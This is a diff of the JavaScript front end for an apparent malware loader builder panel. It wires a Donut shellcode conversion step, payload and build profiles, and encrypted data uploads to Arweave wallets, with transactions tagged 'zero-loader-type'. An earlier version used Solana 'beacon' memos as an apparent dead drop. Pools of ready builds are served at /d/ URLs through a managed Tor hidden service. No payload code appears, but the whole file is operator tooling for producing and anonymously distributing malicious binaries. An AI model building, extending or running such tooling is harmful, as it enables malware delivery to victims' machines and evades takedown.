-  writeConsole(out, "> running donut.exe …\n", { reset: true });
+  writeConsole(out, "> running stub …\n", { reset: true });
   const btn = $("button.primary", e.target);
   btn.disabled = true; btn.textContent = "Converting…";
   try {
@@ -1167,6 +1246,7 @@ $("#form-donut").addEventListener("submit", async (e) => {
 let _wallets = [];
 let _selWalletId = null;
 
+
 async function refreshWallets() {
   try { _wallets = await fetch("/api/wallets").then(r => r.json()); }
   catch (_) { _wallets = []; }
@@ -1175,8 +1255,6 @@ async function refreshWallets() {
     _selWalletId = null;
     showWalletPanel(null);
   }
-  // Also refresh encrypt dropdowns (wallets may have changed)
-  refreshEncryptDropdowns();
 }
 
 function renderWallets() {
@@ -1201,6 +1279,11 @@ function renderWallets() {
 }
 
 function selectWallet(id) {
+  if (id !== _selWalletId) {
+    [$("#out-publish"), $("#out-lookup")].forEach(el => {
+      if (el) { el.textContent = ""; el.classList.remove("ok", "bad"); }
+    });
+  }
   _selWalletId = id;
   renderWallets();
   showWalletPanel(_wallets.find(w => w.id === id) || null);
@@ -1216,12 +1299,47 @@ function showWalletPanel(w) {
   $("#wp-name").textContent = w.name;
   $("#wp-addr").textContent = w.address;
   $("#btn-wallet-dl-kp").href = `/api/wallets/${w.id}/keypair`;
-  // clear outputs
-  [$("#out-publish"), $("#out-lookup")].forEach(el => {
-    el.textContent = ""; el.classList.remove("ok", "bad");
-  });
   $("#wallet-rename-row").classList.add("hidden");
+  // clear upload/lookup outputs when switching wallets
+  const outPub = $("#out-publish");
+  const outLkp = $("#out-lookup");
+  if (outPub) { outPub.textContent = ""; outPub.classList.remove("ok", "bad"); }
+  if (outLkp) { outLkp.textContent = ""; outLkp.classList.remove("ok", "bad"); }
+  const datFile = $("#wp-dat-file");
+  if (datFile) datFile.value = "";
+  fetchWalletBalance(w.id);
 }
+
+async function fetchWalletBalance(wid) {
+  const el  = $("#wp-balance");
+  const btn = $("#btn-refresh-balance");
+  if (!el) return;
+  el.textContent = "…";
+  el.style.color = "";
+  if (btn) btn.disabled = true;
+  try {
+    const r = await fetch(`/api/wallets/${wid}/balance`);
+    const j = await r.json();
+    if (j.ok) {
+      const ar = j.ar.toFixed(6);
+      el.textContent = `${ar} AR`;
+      el.style.color = j.ar > 0 ? "var(--accent)" : "var(--text-mute)";
+    } else {
+      el.textContent = "error";
+      el.style.color = "var(--red)";
+    }
+  } catch {
+    el.textContent = "offline";
+    el.style.color = "var(--text-mute)";
+  } finally {
+    if (btn) btn.disabled = false;
+  }
+}
+
+// refresh balance
+$("#btn-refresh-balance").addEventListener("click", () => {
+  if (_selWalletId) fetchWalletBalance(_selWalletId);
+});
 
 // copy address
 $("#btn-copy-addr").addEventListener("click", async () => {
@@ -1297,63 +1415,80 @@ $("#btn-wallet-delete").addEventListener("click", async () => {
   refreshWallets();
 });
 
-// publish
-$("#form-publish").addEventListener("submit", async (e) => {
-  e.preventDefault();
+// upload to arweave (wallet panel — standalone file upload)
+$("#btn-arweave-upload").addEventListener("click", async () => {
   if (!_selWalletId) return;
-  const out = $("#out-publish");
-  writeConsole(out, "> broadcasting memo …\n", { reset: true });
-  const btn = $("button.primary", e.target);
-  btn.disabled = true; btn.textContent = "Publishing…";
+  const out     = $("#out-publish");
+  const datFile = $("#wp-dat-file")?.files[0];
+  if (!datFile) {
+    writeConsole(out, "[-] Select a data.enc file.\n", { ok: false, reset: true }); return;
+  }
+  writeConsole(out, "> uploading to Arweave … (may take 30–60 s)\n", { reset: true });
+  const btn = $("#btn-arweave-upload");
+  btn.disabled = true; btn.textContent = "Uploading…";
   try {
-    const r = await fetch(`/api/wallets/${_selWalletId}/publish`, {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        memo: $("#wp-memo").value.trim(),
-      }),
-    });
+    const fd = new FormData();
+    fd.append("data_enc", datFile);
+    const r = await fetch(`/api/wallets/${_selWalletId}/publish`, { method: "POST", body: fd });
     const j = await r.json();
+    if (j.stdout) writeConsole(out, j.stdout);
+    if (j.stderr) writeConsole(out, j.stderr);
     if (j.ok) {
-      writeConsole(out,
-        `[+] Sent!\n    Sig: ${j.signature}\n    https://solscan.io/tx/${j.signature}\n`,
-        { ok: true });
+      let msg = `[+] Upload complete!\n`;
+      if (j.tx_id)    msg += `    TX ID  : ${j.tx_id}\n`;
+      if (j.data_url) msg += `    URL    : ${j.data_url}\n`;
+      writeConsole(out, msg, { ok: true });
     } else {
       writeConsole(out, `[-] ${j.error || j.stderr || "Failed"}\n`, { ok: false });
     }
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
-  finally { btn.disabled = false; btn.textContent = "Publish on-chain"; }
+  finally { btn.disabled = false; btn.textContent = "Upload to Arweave"; }
 });
 
-// lookup — two modes
-async function doLookup(mode) {
+// scan wallet transactions via GraphQL
+async function doLookup() {
   if (!_selWalletId) return;
   const out = $("#out-lookup");
-  const label = mode === "beacon" ? "beacon (oldest) memo" : "latest memo";
-  writeConsole(out, `> looking up ${label} …\n`, { reset: true });
-  const btnLatest = $("#btn-lookup-latest");
-  const btnBeacon = $("#btn-lookup-beacon");
-  btnLatest.disabled = btnBeacon.disabled = true;
+  const btn = $("#btn-lookup-tx");
+  btn.disabled = true;
+  writeConsole(out, "> scanning wallet transactions via arweave.net/graphql …\n", { reset: true });
   try {
-    const r = await fetch(`/api/wallets/${_selWalletId}/lookup`, {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ mode }),
-    });
+    const r = await fetch(`/api/wallets/${_selWalletId}/lookup`, { method: "POST" });
     const j = await r.json();
-    if (j.found) {
-      writeConsole(out,
-        `[+] Memo found (scanned ${j.scanned ?? "?"} tx)\n    Sig: ${j.signature}\n\n${j.memo}\n`,
-        { ok: true });
-    } else if (j.error) {
-      writeConsole(out, `[-] ${j.error}\n`, { ok: false });
+    if (!j.ok) {
+      writeConsole(out, `[-] ${j.error || j.stderr || "Failed"}\n`, { ok: false }); return;
+    }
+    const txs = j.transactions || [];
+    writeConsole(out, `[*] Wallet: ${j.address}\n[*] Found ${txs.length} transaction(s)\n`);
+    if (!txs.length) {
+      writeConsole(out, "[*] No transactions yet.\n");
     } else {
-      writeConsole(out, `[-] No memo found (scanned ${j.scanned ?? "?"} tx).\n`);
+      for (const tx of txs) {
+        const blockStr = tx.block ? `block #${tx.block}` : "no block?";
+        const appName = tx.tags?.["App-Name"] || "";
+        const txType  = tx.tags?.["zero-loader-type"] || "";
+        const tagStr  = txType ? `  [${txType}]` : (appName ? `  [${appName}]` : "");
+        let line = `\n── ${tx.tx_id}  (${blockStr})${tagStr}\n    ${tx.url}\n`;
+        if (tx.pending) {
+          line += `    ⏳ gateway 404 — data not yet served (may take 30-60 min after block confirmation)\n`;
+        } else if (tx.error) {
+          line += `    ✗ ${tx.error}\n`;
+        } else if (tx.payload_v2) {
+          line += `    ✓ combined format — header: ${tx.header}\n`;
+        } else if (tx.meta) {
+          line += `    ~ old meta JSON (no longer used): ${JSON.stringify(tx.meta)}\n`;
+        } else if (tx.raw !== undefined) {
+          line += `    ~ unrecognised format: ${tx.raw.slice(0, 80)}\n`;
+        }
+        writeConsole(out, line);
+      }
+      writeConsole(out, "\n[+] Scan complete.\n", { ok: true });
     }
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
-  finally { btnLatest.disabled = btnBeacon.disabled = false; }
+  finally { btn.disabled = false; }
 }
 
-$("#btn-lookup-latest").addEventListener("click", () => doLookup("latest"));
-$("#btn-lookup-beacon").addEventListener("click", () => doLookup("beacon"));
+$("#btn-lookup-tx").addEventListener("click", doLookup);
 
 // ─── Payload.h selector (build panel) ────────────────────────────────────
 
@@ -1385,14 +1520,12 @@ async function refreshPayloadSelector() {
       const item = document.createElement("div");
       item.className = "cdd-item";
       item.dataset.value = r.id;
-      const wallet     = r.wallet      ? trunc(r.wallet, 20) : "—";
       const labelHtml  = r.donut_label
         ? `<span class="cdd-label-badge">${r.donut_label}</span>`
         : "";
       item.innerHTML = `
         <span class="cdd-item-id">#${r.id.slice(0,6)}</span>
         ${labelHtml}
-        <span class="cdd-item-name">${wallet}</span>
         <span class="cdd-item-meta">${fmtTimeShort(r.created_at)}</span>`;
       item.addEventListener("click", () => {
         hidden.value = r.id;
@@ -1422,9 +1555,372 @@ async function refreshPayloadSelector() {
   } catch (_) {}
 }
 
+// ─── pools ────────────────────────────────────────────────────────────────
+
+let _pools = [];
+let _poolEditId = null;
+let _poolStatusTimer = null;
+let _torStatus = null;  // cached tor status for onion URL generation
+
+async function _fetchJson(url, opts) {
+  const r = await fetch(url, opts);
+  if (!r.ok && r.headers.get("content-type")?.includes("text/html")) {
+    throw new Error(`Server returned ${r.status} — is the server running the latest code?`);
+  }
+  return r.json();
+}
+
+async function refreshPools() {
+  try { _pools = await _fetchJson("/api/pools"); }
+  catch (_) { _pools = []; }
+  // fetch tor status to get onion address for URL copy
+  try {
+    const ts = await fetch("/api/tor/status").then(r => r.json());
+    const onion = ts.running && ts.services?.length ? ts.services[0].onion : null;
+    _torStatus = { onion };
+  } catch (_) { _torStatus = { onion: null }; }
+  await _refreshBldProfilesForPool();
+  renderPools();
+  _schedulePoolStatus();
+}
+
+async function _refreshBldProfilesForPool() {
+  // Refresh build profiles for the create/edit selector
+  try {
+    if (!_bldProfiles.length)
+      _bldProfiles = await fetch("/api/profiles/build").then(r => r.json()); _bldProfiles.sort((a,b) => a.name.localeCompare(b.name));
+  } catch (_) {}
+}
+
+function _populatePoolProfileSel(selectedId) {
+  const sel = $("#pf-profile-sel");
+  if (!sel) return;
+  sel.innerHTML = _bldProfiles.length
+    ? `<option value="">— select a build profile —</option>` +
+      _bldProfiles.map(p =>
+        `<option value="${p.id}" ${p.id === selectedId ? "selected" : ""}>${p.name}  (#${p.id} · ${p.mode || "exe"})</option>`
+      ).join("")
+    : `<option value="">— no build profiles yet —</option>`;
+}
+
+function renderPools() {
+  const list  = $("#pool-list");
+  const empty = $("#pool-list-empty");
+  list.querySelectorAll(".pool-item").forEach(el => el.remove());
+
+  if (!_pools.length) { empty.style.display = ""; return; }
+  empty.style.display = "none";
+
+  for (const pool of _pools) {
+    const el = document.createElement("div");
+    el.className = "pool-item";
+    el.dataset.pid = pool.id;
+
+    const count   = pool.ready_count ?? 0;
+    const target  = pool.target_count ?? 10;
+    const paused  = !!pool.paused;
+    const cntCls  = count === 0 ? "empty" : (count >= target ? "full" : "");
+    const bldHtml = pool.building
+      ? `<span class="pi-building">⟳ building</span>`
+      : paused ? `<span class="pi-paused">⏸ paused</span>` : "";
+    const torOnion = _torStatus?.onion || null;
+    const localUrl = `${location.protocol}//${location.host}/d/${pool.slug}`;
+    const torUrl   = torOnion ? `http://${torOnion}/d/${pool.slug}` : null;
+
+    el.innerHTML = `
+      <div class="pi-row">
+        <span class="pi-name">${pool.name}</span>
+        <span class="pi-slug">/d/${pool.slug}</span>
+        <div class="pi-status">
+          <span class="pi-count ${cntCls}">${count} / ${target} ready</span>
+          ${bldHtml}
+        </div>
+        <div class="pi-spacer"></div>
+        <div class="pi-btns">
+          <button class="btn-xs" data-copy-local title="${localUrl}">Local</button>
+          <button class="btn-xs" data-copy-tor title="${torUrl || ''}" ${torUrl ? '' : 'disabled'}>Tor</button>
+          <button class="btn-xs ${paused ? "primary" : ""}" data-pause title="${paused ? "Resume filling" : "Pause filling"}">${paused ? "▶ Resume" : "⏸ Pause"}</button>
+          <button class="btn-xs btn-danger" data-clear title="Clear all ready builds">Clear</button>
+          <button class="btn-xs" data-edit title="Edit pool settings">Edit</button>
+          <button class="btn-xs btn-danger" data-del title="Delete pool">✕</button>
+        </div>
+      </div>
+      <!-- inline edit row (hidden) -->
+      <div class="pi-edit-row hidden" data-edit-row>
+        <label>Name<input type="text" class="pi-edit-name" value="${pool.name}"></label>
+        <label>Build profile
+          <select class="pi-edit-profile select-field-sm"></select>
+        </label>
+        <label>Target<input type="number" class="pi-edit-target" value="${target}" min="1" max="50"></label>
+        <div class="pi-edit-actions">
+          <button class="btn-xs primary" data-save-edit>Save</button>
+          <button class="btn-xs" data-cancel-edit>✕</button>
+        </div>
+      </div>`;
+
+    // populate the edit profile selector
+    const editSel = el.querySelector(".pi-edit-profile");
+    editSel.innerHTML = _bldProfiles.length
+      ? _bldProfiles.map(p =>
+          `<option value="${p.id}" ${p.id === pool.profile_id ? "selected" : ""}>${p.name}  (#${p.id})</option>`
+        ).join("")
+      : `<option value="">— none —</option>`;
+
+    // wire buttons
+    function flashCopy(btn, text) {
+      navigator.clipboard.writeText(text).catch(() => {});
+      const orig = btn.textContent;
+      btn.textContent = "Copied!";
+      setTimeout(() => { btn.textContent = orig; }, 1500);
+    }
+    el.querySelector("[data-copy-local]").addEventListener("click", e => flashCopy(e.currentTarget, localUrl));
+    if (torUrl) el.querySelector("[data-copy-tor]").addEventListener("click", e => flashCopy(e.currentTarget, torUrl));
+
+    el.querySelector("[data-pause]").addEventListener("click", async () => {
+      await fetch(`/api/pools/${pool.id}/pause`, { method: "POST" });
+      await refreshPools();
+    });
+
+
+    el.querySelector("[data-clear]").addEventListener("click", async () => {
+      if (!confirm(`Clear all ${count} ready build(s) from "${pool.name}"?`)) return;
+      await fetch(`/api/pools/${pool.id}/clear`, { method: "POST" });
+      await refreshPools();
+    });
+
+    const editRow = el.querySelector("[data-edit-row]");
+    el.querySelector("[data-edit]").addEventListener("click", () => {
+      editRow.classList.toggle("hidden");
+    });
+    el.querySelector("[data-cancel-edit]").addEventListener("click", () => {
+      editRow.classList.add("hidden");
+    });
+    el.querySelector("[data-save-edit]").addEventListener("click", async () => {
+      const name       = el.querySelector(".pi-edit-name").value.trim();
+      const profile_id = el.querySelector(".pi-edit-profile").value;
+      const target_count = parseInt(el.querySelector(".pi-edit-target").value) || 10;
+      const r = await _fetchJson(`/api/pools/${pool.id}`, {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name, profile_id, target_count }),
+      }).catch(() => ({}));
+      if (r.ok) { editRow.classList.add("hidden"); await refreshPools(); }
+    });
+
+    el.querySelector("[data-del]").addEventListener("click", async () => {
+      if (!confirm(`Delete pool "${pool.name}" (/d/${pool.slug})?\nAll ${count} ready build(s) will be discarded.`)) return;
+      await fetch(`/api/pools/${pool.id}`, { method: "DELETE" });
+      await refreshPools();
+    });
+
+    list.appendChild(el);
+  }
+}
+
+// auto-refresh status while any pool is building
+function _schedulePoolStatus() {
+  clearInterval(_poolStatusTimer);
+  if (_pools.some(p => p.building)) {
+    _poolStatusTimer = setInterval(async () => {
+      // lightweight status poll — only update counts, don't re-render profile selectors
+      try {
+        const fresh = await _fetchJson("/api/pools");
+        if (JSON.stringify(fresh) !== JSON.stringify(_pools)) {
+          _pools = fresh;
+          renderPools();
+        }
+        if (!_pools.some(p => p.building)) clearInterval(_poolStatusTimer);
+      } catch (_) { clearInterval(_poolStatusTimer); }
+    }, 3000);
+  }
+}
+
+// new pool form
+$("#btn-pool-new").addEventListener("click", async () => {
+  _poolEditId = null;
+  $("#pool-form-title").textContent = "New Pool";
+  $("#pf-name").value   = "";
+  $("#pf-slug").value   = "";
+  $("#pf-target").value = "10";
+  $("#pf-slug").disabled = false;
+  await _refreshBldProfilesForPool();
+  _populatePoolProfileSel("");
+  $("#pool-form-error").classList.add("hidden");
+  $("#btn-pool-form-confirm").textContent = "Create";
+  $("#pool-form-wrap").classList.remove("hidden");
+  $("#pf-name").focus();
+});
+
+$("#btn-pool-form-cancel").addEventListener("click", () => {
+  $("#pool-form-wrap").classList.add("hidden");
+  $("#pool-form-error").classList.add("hidden");
+});
+
+$("#btn-pool-form-confirm").addEventListener("click", async () => {
+  const name       = $("#pf-name").value.trim();
+  const slug       = $("#pf-slug").value.trim().toLowerCase();
+  const profile_id = $("#pf-profile-sel").value;
+  const target_count = parseInt($("#pf-target").value) || 10;
+  const errEl = $("#pool-form-error");
+  errEl.classList.add("hidden");
+
+  if (!name) { showPoolErr("Name is required."); return; }
+  if (!slug)  { showPoolErr("Slug is required."); return; }
+  if (!/^[a-z0-9][a-z0-9-]{0,29}$/.test(slug)) {
+    showPoolErr("Slug must be lowercase alphanumeric + hyphens, 1–30 chars."); return;
+  }
+  if (!profile_id) { showPoolErr("Select a build profile."); return; }
+
+  const btn = $("#btn-pool-form-confirm");
+  btn.disabled = true; btn.textContent = "Creating…";
+  try {
+    const r = await _fetchJson("/api/pools", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ name, slug, profile_id, target_count }),
+    });
+    if (r.ok) {
+      $("#pool-form-wrap").classList.add("hidden");
+      await refreshPools();
+    } else {
+      showPoolErr(r.error || "Failed to create pool.");
+    }
+  } catch (err) {
+    showPoolErr(`Network error: ${err}`);
+  } finally {
+    btn.disabled = false; btn.textContent = "Create";
+  }
+});
+
+function showPoolErr(msg) {
+  const el = $("#pool-form-error");
+  el.textContent = msg;
+  el.classList.remove("hidden");
+}
+
+// ─── Tor ──────────────────────────────────────────────────────────────────
+
+async function torRefresh() {
+  let s = {};
+  try { s = await fetch("/api/tor/status").then(r => r.json()); } catch { }
+
+  const dot   = $("#tor-dot");
+  const label = $("#tor-status-label");
+  const meta  = $("#tor-status-meta");
+
+  if (s.running) {
+    dot.className = "tor-dot running";
+    label.textContent = "Running";
+    label.style.color = "var(--ok)";
+    meta.textContent  = `PID ${s.pid}`;
+  } else {
+    dot.className = "tor-dot stopped";
+    label.textContent = "Stopped";
+    label.style.color = "var(--err)";
+    meta.textContent  = "";
+  }
+  $("#btn-tor-start").disabled   = !!s.running;
+  $("#btn-tor-stop").disabled    = !s.running;
+  $("#btn-tor-restart").disabled = !s.running;
+
+  const list = $("#tor-service-list");
+  const svcs = s.services || [];
+  if (!svcs.length) {
+    list.innerHTML = '<p class="empty-note">No hidden services found in torrc.</p>';
+  } else {
+    list.innerHTML = svcs.map(svc => {
+      const onionHtml = svc.onion
+        ? `<span class="tor-onion">${svc.onion}</span>
+           <button class="btn-sm" style="font-size:10px" onclick="torCopy('${svc.onion}',this)">Copy</button>`
+        : `<span class="tor-onion-placeholder">not yet generated — start Tor first</span>`;
+
+      const ports = (svc.ports || []).map(p =>
+        `<span class="tor-port-badge">:${p.virtual} → ${p.target}</span>`
+      ).join("");
+
+      const urls = (svc.ports || []).map(p => {
+        if (!svc.onion) return "";
+        const url = `http://${svc.onion}:${p.virtual}`;
+        return `<div class="tor-url-row">
+          <span>${url}</span>
+          <button class="btn-sm" style="font-size:10px" onclick="torCopy('${url}',this)">Copy</button>
+        </div>`;
+      }).join("");
+
+      return `<div class="tor-service-card">
+        <div style="display:flex;align-items:center;gap:10px">${onionHtml}</div>
+        <div class="tor-dir">${svc.dir}</div>
+        <div class="tor-ports">${ports || '<span style="font-size:11px;color:var(--text-mute)">no ports</span>'}</div>
+        ${urls}
+      </div>`;
+    }).join("");
+  }
+}
+
+async function torCopy(text, btn) {
+  try { await navigator.clipboard.writeText(text); } catch { }
+  const orig = btn.textContent;
+  btn.textContent = "Copied!";
+  setTimeout(() => { btn.textContent = orig; }, 1500);
+}
+
+async function torAction(endpoint) {
+  ["btn-tor-start","btn-tor-stop","btn-tor-restart","btn-tor-refresh"].forEach(id => {
+    const el = $("#" + id); if (el) el.disabled = true;
+  });
+  try {
+    const r = await fetch(`/api/tor/${endpoint}`, { method: "POST" });
+    const j = await r.json();
+    if (!j.ok) alert("Tor error: " + (j.error || "unknown"));
+  } catch (e) { alert("Request failed: " + e); }
+  await torRefresh();
+  ["btn-tor-start","btn-tor-stop","btn-tor-restart","btn-tor-refresh"].forEach(id => {
+    const el = $("#" + id); if (el) el.disabled = false;
+  });
+}
+
+async function torLoadLog() {
+  const box = $("#tor-log-box");
+  if (!box) return;
+  try {
+    const j = await fetch("/api/tor/log").then(r => r.json());
+    box.textContent = (j.lines || []).join("\n") || "(no log entries)";
+    box.scrollTop = box.scrollHeight;
+  } catch { box.textContent = "(failed to load log)"; }
+}
+
+$("#btn-tor-start").addEventListener("click",   () => torAction("start"));
+$("#btn-tor-stop").addEventListener("click",    () => torAction("stop"));
+$("#btn-tor-restart").addEventListener("click", () => torAction("restart"));
+$("#btn-tor-refresh").addEventListener("click", torRefresh);
+$("#btn-tor-log-refresh").addEventListener("click", torLoadLog);
+
+$("#btn-tor-port").addEventListener("click", async () => {
+  const virtual = $("#tor-vport").value.trim();
+  const target  = $("#tor-target").value.trim();
+  const msg     = $("#tor-port-msg");
+  if (!virtual || !target) { msg.textContent = "fill both fields"; msg.style.color = "var(--err)"; return; }
+  msg.textContent = "Saving…"; msg.style.color = "var(--text-mute)";
+  try {
+    const r = await fetch("/api/tor/port", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ virtual, target }),
+    });
+    const j = await r.json();
+    if (j.ok) {
+      msg.textContent = "Saved — restart Tor to apply"; msg.style.color = "var(--ok)";
+      await torRefresh();
+    } else {
+      msg.textContent = j.error || "error"; msg.style.color = "var(--err)";
+    }
+  } catch (e) { msg.textContent = String(e); msg.style.color = "var(--err)"; }
+  setTimeout(() => { msg.textContent = ""; }, 4000);
+});
+
+
 // ─── boot ─────────────────────────────────────────────────────────────────
 
-refreshStatus();
 refreshEncProfiles();
 refreshBldProfiles();
 refreshEncryptDropdowns();
@@ -1432,3 +1928,9 @@ refreshSideloadAssets();
 refreshEncryptHistory();
 refreshBuildHistory();
 refreshPayloadSelector();
+
+// Restore tab from URL hash — must run after all let declarations above
+(function () {
+  const hash = location.hash.replace("#", "");
+  navigateTo(VALID_PAGES.has(hash) ? hash : "build", false);
+})();
